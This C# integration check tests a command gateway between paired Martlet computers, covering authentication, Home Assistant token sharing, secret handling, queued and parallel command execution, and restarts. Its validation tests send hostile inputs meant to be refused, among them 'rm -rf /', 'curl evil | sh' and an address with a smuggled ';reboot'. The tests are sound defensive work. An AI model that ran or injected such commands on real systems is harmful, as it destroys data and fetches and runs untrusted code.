using System.Buffers.Text;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Martlet.HostClient;
using Martlet.Core.Nodes;
using static Martlet.NodeLinkCheck.CheckHelpers;

namespace Martlet.NodeLinkCheck;

/// <summary>The default node link check (no arguments): commands between Martlet computers end to end on this PC's loopback
/// with the real gateway (<see cref="LoopbackHost"/>), the desktop's real client and its real agent loop with a fixture runner
/// (<see cref="FixtureRunner"/>). It also checks Home Assistant sharing through the same gateway.</summary>
internal static class CommandMailboxCheck
{
    internal static async Task RunAsync(CheckSteps check)
    {
        void Step(string name, bool ok, string detail) => check.Step(name, ok, detail);
        using var certificate = Fixture.Certificate();
        var storage = new MemoryStorage();
        var token = Base64Url.EncodeToString(RandomNumberGenerator.GetBytes(32));
        var wrongToken = Base64Url.EncodeToString(RandomNumberGenerator.GetBytes(32));
        await using var host = await LoopbackHost.StartAsync(certificate, storage, token);
        var (requesterPairing, requesterSecret) = await host.PairAsync("check-requester");
        var (agentPairing, agentSecret) = await host.PairAsync("check-agent");
        using var asker = new HostConnection(requesterPairing, requesterSecret);
        using var agentConnection = new HostConnection(agentPairing, agentSecret);
        var runner = new FixtureRunner();
        var agent = new NodeCommandAgent(_ => Task.FromResult<string?>(token), "9.9.9", runner);

        var list = await asker.ReadCommandsAsync();
        Step("list-empty", list.Agent is null && list.Commands.Count == 0, $"agent {list.Agent?.DeviceId ?? "none"}, {list.Commands.Count} commands");

        var anonymous = await Raw.SendAsync(requesterPairing, null, HttpMethod.Get, "/martlet/v1/commands", null);
        Step("anonymous-refused", anonymous.Status == HttpStatusCode.Unauthorized && anonymous.Body.Contains("auth.missing"),
            $"HTTP {(int)anonymous.Status}");

        var shell = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Post, "/martlet/v1/commands",
            """{"kind":"host.shell","arguments":{"command":"rm -rf /"}}""");
        var badVersion = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Post, "/martlet/v1/commands",
            """{"kind":"martlet.update","arguments":{"version":"latest"}}""");
        var extraArgument = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Post, "/martlet/v1/commands",
            """{"kind":"host.add-role","arguments":{"role":"ollama","command":"curl evil | sh"}}""");
        var extraField = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Post, "/martlet/v1/commands",
            """{"kind":"host.status","script":"x"}""");
        Step("only-known-commands", new[] { shell, badVersion, extraArgument, extraField }.All(r => r.Status == HttpStatusCode.BadRequest &&
            r.Body.Contains("request.invalid")), $"unknown kind {(int)shell.Status}, bad version {(int)badVersion.Status}, " +
            $"extra argument {(int)extraArgument.Status}, extra field {(int)extraField.Status}");

        const string haToken = "fixture-ha-token-0123456789abcdef";
        var haInitial = new SharedHomeAssistant(1_790_000_000_000, "http://192.168.1.20:8123", haToken, "Home", "2026.9.4");
        var haShared = await asker.ShareHomeAssistantAsync(haInitial);
        var haReadByB = await agentConnection.ReadHomeAssistantAsync();
        Step("home-assistant-share", SameHomeAssistant(haReadByB, haInitial) &&
            haReadByB is { UpdatedBy: "check-requester", UpdatedAt: not null } && SameHomeAssistant(haShared, haInitial),
            $"revision {haReadByB?.Revision}, token shared {haReadByB?.Token == haToken}, writer {haReadByB?.UpdatedBy}");

        var haLower = await agentConnection.ShareHomeAssistantAsync(haInitial with
        {
            Revision = haInitial.Revision - 1,
            Address = "http://192.168.1.30:8123",
            Token = "fixture-ha-token-lower-012345"
        });
        var haHigherValue = new SharedHomeAssistant(haInitial.Revision + 1, "https://192.168.1.30:8123",
            "fixture-ha-token-higher-012345", "Cabin", "2026.10.0");
        var haHigher = await agentConnection.ShareHomeAssistantAsync(haHigherValue);
        var haEqualRequesterValue = new SharedHomeAssistant(haHigherValue.Revision, "https://192.168.1.31:8123",
            "fixture-ha-token-equal-requester", "Home main", "2026.10.1");
        var haEqualRequester = await asker.ShareHomeAssistantAsync(haEqualRequesterValue);
        var haEqualAgentLost = await agentConnection.ShareHomeAssistantAsync(haEqualRequesterValue with
        {
            Address = "https://192.168.1.32:8123",
            Token = "fixture-ha-token-equal-agent",
            LocationName = "Should lose"
        });
        Step("home-assistant-revisions", SameHomeAssistant(haLower, haInitial) && haLower?.UpdatedBy == "check-requester" &&
            SameHomeAssistant(haHigher, haHigherValue) && haHigher?.UpdatedBy == "check-agent" &&
            SameHomeAssistant(haEqualRequester, haEqualRequesterValue) && haEqualRequester?.UpdatedBy == "check-requester" &&
            SameHomeAssistant(haEqualAgentLost, haEqualRequesterValue) && haEqualAgentLost?.UpdatedBy == "check-requester",
            $"lower kept {haLower?.UpdatedBy}; higher {haHigher?.UpdatedBy}; equal winner {haEqualRequester?.UpdatedBy}");

        var haTombstone = await agentConnection.ShareHomeAssistantAsync(new SharedHomeAssistant(haEqualRequesterValue.Revision + 1,
            null, null, null, null));
        var haReadTombstone = await asker.ReadHomeAssistantAsync();
        Step("home-assistant-tombstone", haTombstone is { Address: null, Token: null, LocationName: null, Version: null,
                UpdatedBy: "check-agent" } && haReadTombstone is { Address: null, Token: null } &&
            haReadTombstone.Revision == haTombstone.Revision,
            $"revision {haReadTombstone?.Revision}, writer {haReadTombstone?.UpdatedBy}, address {(haReadTombstone?.Address is null ? "null" : "set")}");

        var haAddressWithoutToken = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Post, "/martlet/v1/home-assistant",
            """{"revision":1790000000100,"address":"http://192.168.1.20:8123","token":null}""");
        var haBadScheme = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Post, "/martlet/v1/home-assistant",
            """{"revision":1790000000101,"address":"ftp://192.168.1.20:8123","token":"fixture-ha-token-invalid"}""");
        var haTooLongToken = new string('x', 4097);
        var haTooLong = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Post, "/martlet/v1/home-assistant",
            JsonSerializer.Serialize(new { revision = 1_790_000_000_102, address = "http://192.168.1.20:8123", token = haTooLongToken }));
        Step("home-assistant-invalid", new[] { haAddressWithoutToken, haBadScheme, haTooLong }.All(r =>
                r.Status == HttpStatusCode.BadRequest && r.Body.Contains("request.invalid")),
            $"address/token {(int)haAddressWithoutToken.Status}, scheme {(int)haBadScheme.Status}, token {(int)haTooLong.Status}");

        var haRestartValue = new SharedHomeAssistant(haTombstone!.Revision + 1, "https://192.168.1.21:8123",
            "fixture-ha-token-restart-012345", "Workshop", "2026.10.2");
        var haBeforeRestart = await asker.ShareHomeAssistantAsync(haRestartValue);
        await using (var restartedHa = await LoopbackHost.StartAsync(certificate, storage, Base64Url.EncodeToString(RandomNumberGenerator.GetBytes(32))))
        {
            var (haAfterPairing, haAfterSecret) = await restartedHa.PairAsync("check-ha-restart");
            using var haAfterConnection = new HostConnection(haAfterPairing, haAfterSecret);
            var haAfterRestart = await haAfterConnection.ReadHomeAssistantAsync();
            Step("home-assistant-restart", SameHomeAssistant(haBeforeRestart, haRestartValue) &&
                SameHomeAssistant(haAfterRestart, haRestartValue) && haAfterRestart?.UpdatedBy == "check-requester",
                $"stored revision {haAfterRestart?.Revision}, token survived {haAfterRestart?.Token == haRestartValue.Token}");
        }

        var ownLogs = await asker.ReadOwnLogsAsync(0);
        var activityText = string.Join('\n', ownLogs.Entries.Select(e => e.Message));
        var savedLogText = Encoding.UTF8.GetString(storage.LogsSaved ?? []);
        var tokensAbsent = new[] { haToken, haHigherValue.Token!, haEqualRequesterValue.Token!, haRestartValue.Token! }
            .All(value => !activityText.Contains(value, StringComparison.Ordinal) && !savedLogText.Contains(value, StringComparison.Ordinal));
        Step("home-assistant-token-not-logged", tokensAbsent,
            $"activity lines {ownLogs.Entries.Count}, saved log bytes {storage.LogsSaved?.Length ?? 0}");

        var update = await asker.SendCommandAsync(NodeCommandKinds.Update, new Dictionary<string, string> { ["version"] = "9.9.9" });
        Step("send-update", update.State == NodeCommandState.Queued && update.RequestedBy == "check-requester",
            $"{update.Kind} {update.State} from {update.RequestedBy}");
        var again = await asker.SendCommandAsync(NodeCommandKinds.Update, new Dictionary<string, string> { ["version"] = "9.9.9" });
        Step("same-request-is-one-command", again.Id == update.Id, again.Id == update.Id ? "same ID" : "a second command");

        var stolen = await Expect(() => asker.TakeCommandAsync(wrongToken, null, NodeCommandKinds.All), "command.agent");
        var stolenReport = await Expect(() => asker.ReportCommandAsync(wrongToken, update.Id, ["fake"], "fake", NodeCommandState.Succeeded), "command.agent");
        Step("only-the-agent-takes-and-reports", stolen && stolenReport, "a paired computer without the host's local token was refused");

        var pass = await agent.RunOnceAsync(agentConnection, CancellationToken.None);
        Step("agent-runs-it", pass.Kind == NodeAgentPassKind.Ran && pass.Outcome?.Succeeded == true, pass.Text);
        var done = await asker.ReadCommandAsync(update.Id);
        Step("requester-sees-output-and-outcome", done.State == NodeCommandState.Succeeded && done.ClaimedBy == "check-agent" &&
            done.Output.SequenceEqual(FixtureRunner.UpdateLines) && done.OutputTotal == FixtureRunner.UpdateLines.Length && done.ExitCode == 0,
            $"{done.State} by {done.ClaimedBy}; {done.OutputTotal} lines; {done.Summary}");
        list = await asker.ReadCommandsAsync();
        Step("agent-is-visible", list.Agent is { DeviceId: "check-agent", Version: "9.9.9" } && list.Agent.Kinds.Count == NodeCommandKinds.All.Count,
            $"agent {list.Agent?.DeviceId} (Martlet {list.Agent?.Version}), {list.Agent?.Kinds.Count} kinds");

        const string secret = "fixture-secret-0f3a9c";
        var add = await asker.SendCommandAsync(NodeCommandKinds.AddRole,
            new Dictionary<string, string> { ["role"] = "fixture-role", ["choice.MODEL"] = "small" },
            new Dictionary<string, string> { ["secret.api-key"] = secret });
        var listed = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Get, "/martlet/v1/commands", null);
        var one = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Get, "/martlet/v1/commands/" + add.Id, null);
        var saved = Encoding.UTF8.GetString(storage.Saved ?? []);
        pass = await agent.RunOnceAsync(agentConnection, CancellationToken.None);
        var afterRun = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Get, "/martlet/v1/commands/" + add.Id, null);
        Step("secrets-stay-private", add.HasSecrets && !listed.Body.Contains(secret) && !one.Body.Contains(secret) && !saved.Contains(secret) &&
            !afterRun.Body.Contains(secret) && runner.SecretsSeen.Count(s => s == secret) == 1 && runner.LastChoice == "small" &&
            pass.Outcome?.Succeeded == true,
            "the agent received the secret once; no list, command or saved copy contained it");

        // Outside access through the host's own Martlet: the gateway and the agent accept only the closed arguments, and the agent
        // turns them into exactly the martlet-host exposure options (NodeCommandRules.ExposureOptions).
        var exposure = await asker.SendCommandAsync(NodeCommandKinds.Exposure,
            NodeCommandRules.ExposureArguments(["Home.Example.net:9443", "100.101.102.103:9443"], false, true));
        var badAddress = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Post, "/martlet/v1/commands",
            """{"kind":"host.exposure","arguments":{"outside":"evil;reboot:1","pairing_codes_outside":"no","treat_all_as_outside":"yes"}}""");
        var extraOption = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Post, "/martlet/v1/commands",
            """{"kind":"host.exposure","arguments":{"outside":"","pairing_codes_outside":"no","treat_all_as_outside":"yes","config":"/etc"}}""");
        var badExposure = new[] { badAddress, extraOption }.All(r => r.Status == HttpStatusCode.BadRequest && r.Body.Contains("request.invalid"));
        pass = await agent.RunOnceAsync(agentConnection, CancellationToken.None);
        var exposed = await asker.ReadCommandAsync(exposure.Id);
        Step("exposure-command", exposed.State == NodeCommandState.Succeeded && badExposure &&
            runner.LastExposure == "exposure --outside home.example.net:9443 --outside 100.101.102.103:9443 --allow-pairing-outside-home no --treat-all-as-outside yes",
            $"{exposed.State}: the agent would run '{runner.LastExposure}'; an address with a shell character was refused: {badExposure}");

        var waiting = await asker.SendCommandAsync(NodeCommandKinds.Status, new Dictionary<string, string>());
        var withdrawn = await asker.CancelCommandAsync(waiting.Id);
        pass = await agent.RunOnceAsync(agentConnection, CancellationToken.None);
        Step("cancel-waiting", withdrawn.State == NodeCommandState.Canceled && pass.Kind == NodeAgentPassKind.Idle,
            $"{withdrawn.State}; agent then {pass.Kind}");

        // Commands side by side: the agent takes every command it may start and runs each in the background on its own
        // connection. Changes to other roles, status and reading a role run at once; a second change to one role waits for the
        // first, and an update waits for what runs and holds the commands sent after it.
        HostConnection ConnectAgent() => new(agentPairing, agentSecret);
        async Task<NodeCommandState> StateAsync(string id) => (await asker.ReadCommandAsync(id)).State;
        var slow = await asker.SendCommandAsync(NodeCommandKinds.DescribeRole, new Dictionary<string, string> { ["role"] = "slow-role" });
        var holdA = await asker.SendCommandAsync(NodeCommandKinds.AddRole, new Dictionary<string, string> { ["role"] = "hold-a" });
        var holdB = await asker.SendCommandAsync(NodeCommandKinds.AddRole, new Dictionary<string, string> { ["role"] = "hold-b" });
        var took = await agent.TakeAsync(ConnectAgent, CancellationToken.None);
        var allRunning = await UntilAsync(() => Task.FromResult(runner.Active == 3));
        var sideBySide = await asker.ReadCommandsAsync();
        Step("runs-side-by-side", took.Kind == NodeAgentPassKind.Started && allRunning && agent.Running.Count == 3 &&
            sideBySide.Commands.Count(c => c.State == NodeCommandState.Running) == 3 && sideBySide.Agent?.Parallel == true,
            $"{took.Text} The fixture runner ran {runner.Active} at once; the gateway shows " +
            $"{sideBySide.Commands.Count(c => c.State == NodeCommandState.Running)} running (agent runs them side by side: {sideBySide.Agent?.Parallel})");

        var holdAgain = await asker.SendCommandAsync(NodeCommandKinds.AddRole, new Dictionary<string, string> { ["role"] = "hold-a", ["choice.MODEL"] = "large" });
        var beside = await asker.SendCommandAsync(NodeCommandKinds.Status, new Dictionary<string, string>());
        var barrier = await asker.SendCommandAsync(NodeCommandKinds.Update, new Dictionary<string, string> { ["version"] = "9.9.7" });
        var afterBarrier = await asker.SendCommandAsync(NodeCommandKinds.RemoveRole, new Dictionary<string, string> { ["role"] = "after-barrier" });
        var second = await agent.TakeAsync(ConnectAgent, CancellationToken.None);
        var besideDone = await UntilAsync(async () => await StateAsync(beside.Id) == NodeCommandState.Succeeded);
        var queue = await asker.ReadCommandsAsync();
        var sameRoleText = queue.WaitingText(holdAgain, "check-host");
        Step("same-role-waits", second.Command?.Id == beside.Id && queue.Commands.First(c => c.Id == holdAgain.Id).State == NodeCommandState.Queued &&
            queue.Ahead(holdAgain)?.Id == holdA.Id && sameRoleText?.Contains("already changing hold-a", StringComparison.Ordinal) == true,
            sameRoleText ?? "nothing holds it back");
        Step("others-run-beside", besideDone && runner.Active == 3,
            $"status ran ({(besideDone ? "succeeded" : "not finished")}) while {runner.Active} commands kept running");
        var updateText = queue.WaitingText(barrier, "check-host");
        var barrierText = queue.WaitingText(afterBarrier, "check-host");
        Step("update-waits-for-running", queue.Commands.First(c => c.Id == barrier.Id).State == NodeCommandState.Queued &&
            updateText?.Contains("updates as soon as what it runs now ends", StringComparison.Ordinal) == true &&
            queue.Ahead(afterBarrier)?.Id == barrier.Id && barrierText?.Contains("updates first", StringComparison.Ordinal) == true,
            $"{updateText ?? "update not held back"} / {barrierText ?? "later command not held back"}");

        runner.Release("hold-a");
        var firstDone = await UntilAsync(async () => await StateAsync(holdA.Id) == NodeCommandState.Succeeded);
        var ended = agent.Collect();
        var next = await agent.TakeAsync(ConnectAgent, CancellationToken.None);
        var againDone = await UntilAsync(async () => await StateAsync(holdAgain.Id) == NodeCommandState.Succeeded);
        Step("same-role-runs-next", firstDone && ended.Any(e => e.Command?.Id == holdA.Id && e.Kind == NodeAgentPassKind.Ran) &&
            next.Command?.Id == holdAgain.Id && againDone && runner.LastChoice == "large",
            $"after Install hold-a ended: {next.Text}");

        var stopping = await asker.CancelCommandAsync(slow.Id);
        var stoppedState = await UntilAsync(async () => await StateAsync(slow.Id) == NodeCommandState.Canceled);
        Step("cancel-running", stopping.CancelRequested && stoppedState && runner.Canceled,
            $"cancel requested {stopping.CancelRequested}; ended {await StateAsync(slow.Id)}");
        var stillHeld = await asker.ReadCommandsAsync();
        var heldByB = stillHeld.Commands.First(c => c.Id == barrier.Id).State == NodeCommandState.Queued;
        runner.Release("hold-b");
        await UntilAsync(async () => await StateAsync(holdB.Id) == NodeCommandState.Succeeded);
        agent.Collect();
        var updateTaken = await agent.TakeAsync(ConnectAgent, CancellationToken.None);
        var updateRan = await UntilAsync(async () => await StateAsync(barrier.Id) == NodeCommandState.Succeeded);
        var duringUpdate = agent.Collect();
        var afterTaken = await agent.TakeAsync(ConnectAgent, CancellationToken.None);
        var afterRan = await UntilAsync(async () => await StateAsync(afterBarrier.Id) == NodeCommandState.Succeeded);
        agent.Collect();
        var order = runner.Events;
        var alone = runner.ActiveWhenStarted.GetValueOrDefault(barrier.Id, -1) == 0;
        var afterUpdateEnded = order.IndexOf("end " + barrier.Id) is >= 0 and var endUpdate && order.IndexOf("start " + afterBarrier.Id) > endUpdate;
        Step("update-runs-alone-then-the-rest", heldByB && updateTaken.Command?.Id == barrier.Id && updateRan && alone &&
            duringUpdate.Any(e => e.Command?.Id == barrier.Id) && afterTaken.Command?.Id == afterBarrier.Id && afterRan && afterUpdateEnded,
            $"held while Install hold-b ran: {heldByB}; then {updateTaken.Text} (nothing else running: {alone}), then {afterTaken.Text}");

        // An agent from before commands ran side by side (no list of running commands) still gets one at a time.
        var serialFirst = await asker.SendCommandAsync(NodeCommandKinds.DescribeRole, new Dictionary<string, string> { ["role"] = "serial-one" });
        var serialSecond = await asker.SendCommandAsync(NodeCommandKinds.DescribeRole, new Dictionary<string, string> { ["role"] = "serial-two" });
        var oldTake = await agentConnection.TakeCommandAsync(token, "0.38.1", NodeCommandKinds.All);
        var oldAgain = await agentConnection.TakeCommandAsync(token, "0.38.1", NodeCommandKinds.All);
        var serialQueue = await asker.ReadCommandsAsync();
        var serialText = serialQueue.WaitingText(serialSecond, "check-host");
        await agentConnection.ReportCommandAsync(token, serialFirst.Id, ["FIXTURE: read serial-one"], "FIXTURE - read.", NodeCommandState.Succeeded, 0);
        var oldNext = await agentConnection.TakeCommandAsync(token, "0.38.1", NodeCommandKinds.All);
        await agentConnection.ReportCommandAsync(token, serialSecond.Id, ["FIXTURE: read serial-two"], "FIXTURE - read.", NodeCommandState.Succeeded, 0);
        Step("serial-agent-one-at-a-time", oldTake.Command?.Id == serialFirst.Id && oldAgain.Command?.Id == serialFirst.Id && oldAgain.Resumed &&
            serialQueue.Agent?.Parallel == false && serialText?.Contains("busy with: Read what serial-one needs", StringComparison.Ordinal) == true &&
            oldNext.Command?.Id == serialSecond.Id,
            $"{serialText ?? "nothing ahead"}; then {(oldNext.Command is { } taken ? NodeCommandAgent.Describe(taken) : "nothing")}");

        // An update the host's Martlet can't install yet (someone is using it there) stays first and holds the queue; a command
        // sent meanwhile says it waits behind the update and runs once the update is done.
        var waitingUpdate = await asker.SendCommandAsync(NodeCommandKinds.Update, new Dictionary<string, string> { ["version"] = FixtureRunner.BusyVersion });
        var first = await agent.RunOnceAsync(agentConnection, CancellationToken.None);
        var afterUpdate = await asker.SendCommandAsync(NodeCommandKinds.RemoveRole, new Dictionary<string, string> { ["role"] = "after-update-role" });
        var held = await agent.RunOnceAsync(agentConnection, CancellationToken.None);
        var queueDuringUpdate = await asker.ReadCommandsAsync();
        var behindUpdate = queueDuringUpdate.WaitingText(afterUpdate, "check-host");
        var heldOk = first.Kind == NodeAgentPassKind.Pending && held.Kind == NodeAgentPassKind.Pending && held.Command?.Id == waitingUpdate.Id &&
            queueDuringUpdate.Commands.First(c => c.Id == afterUpdate.Id).State == NodeCommandState.Queued &&
            queueDuringUpdate.Ahead(afterUpdate)?.Id == waitingUpdate.Id && behindUpdate?.Contains("is updating first", StringComparison.Ordinal) == true;
        Step("update-waits-and-holds-queue", heldOk, $"{first.Kind}, then {held.Kind}; {behindUpdate ?? "nothing ahead"}");
        runner.UpdateMayInstall = true;
        var updated = await agent.RunOnceAsync(agentConnection, CancellationToken.None);
        var then = await agent.RunOnceAsync(agentConnection, CancellationToken.None);
        var updateDone = await asker.ReadCommandAsync(waitingUpdate.Id);
        Step("update-then-queued-command", updated.Kind == NodeAgentPassKind.Ran && updated.Command?.Id == waitingUpdate.Id &&
            updateDone.State == NodeCommandState.Succeeded && updateDone.Output.Contains(FixtureRunner.BusyLine) &&
            then.Kind == NodeAgentPassKind.Ran && then.Command?.Id == afterUpdate.Id,
            $"update {updateDone.State} ({updateDone.OutputTotal} lines), then {(then.Command is { } c ? NodeCommandAgent.Describe(c) : then.Kind.ToString())}");

        await asker.SendCommandAsync(NodeCommandKinds.AddRole, new Dictionary<string, string> { ["role"] = "later-role" },
            new Dictionary<string, string> { ["secret.api-key"] = secret });
        var kept = await asker.SendCommandAsync(NodeCommandKinds.Status, new Dictionary<string, string>());
        await using var restarted = await LoopbackHost.StartAsync(certificate, storage, Base64Url.EncodeToString(RandomNumberGenerator.GetBytes(32)));
        var (afterPairing, afterSecret) = await restarted.PairAsync("check-requester");
        using var afterAsker = new HostConnection(afterPairing, afterSecret);
        var restored = (await afterAsker.ReadCommandsAsync()).Commands;
        var stillUpdate = restored.FirstOrDefault(c => c.Id == update.Id);
        var lostSecrets = restored.FirstOrDefault(c => c.Kind == NodeCommandKinds.AddRole && c.Arguments["role"] == "later-role");
        var stillQueued = restored.FirstOrDefault(c => c.Id == kept.Id);
        Step("restart-keeps-commands", stillUpdate?.State == NodeCommandState.Succeeded && lostSecrets?.State == NodeCommandState.Failed &&
            stillQueued?.State == NodeCommandState.Queued && !Encoding.UTF8.GetString(storage.Saved ?? []).Contains(secret),
            $"update {stillUpdate?.State}, queued with secrets {lostSecrets?.State}, queued without {stillQueued?.State}");
        var oldToken = await Expect(() => afterAsker.TakeCommandAsync(token, null, NodeCommandKinds.All), "command.agent");
        Step("new-token-each-start", oldToken, "the previous start's agent token is refused");

        for (var i = 0; i < GatewayCommandLimits.MaximumActive - 1; i++)
            await afterAsker.SendCommandAsync(NodeCommandKinds.DescribeRole, new Dictionary<string, string> { ["role"] = $"role-{i}" });
        var busy = await Expect(() => afterAsker.SendCommandAsync(NodeCommandKinds.DescribeRole, new Dictionary<string, string> { ["role"] = "one-too-many" }),
            "command.busy");
        Step("bounded-queue", busy, $"the {GatewayCommandLimits.MaximumActive + 1}th waiting command is refused");
    }

    private static bool SameHomeAssistant(SharedHomeAssistant? actual, SharedHomeAssistant expected) =>
        actual is not null && actual.Revision == expected.Revision && actual.Address == expected.Address &&
        actual.Token == expected.Token && actual.LocationName == expected.LocationName && actual.Version == expected.Version;
}
